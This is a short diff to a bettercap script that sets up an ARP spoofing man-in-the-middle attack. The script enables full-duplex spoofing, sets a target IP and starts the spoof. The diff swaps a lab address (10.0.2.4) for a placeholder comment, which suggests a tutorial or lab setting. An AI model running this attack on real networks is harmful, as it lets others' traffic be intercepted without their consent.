@@ -11,7 +11,7 @@ net.show
 set arp.spoof.fullduplex true
 
 #Set the target machine's IP address
-set arp.spoof.targets 10.0.2.4
+set arp.spoof.targets #Replace with your target's IP
 
 #Start the ARP spoofing attack
 arp.spoof on
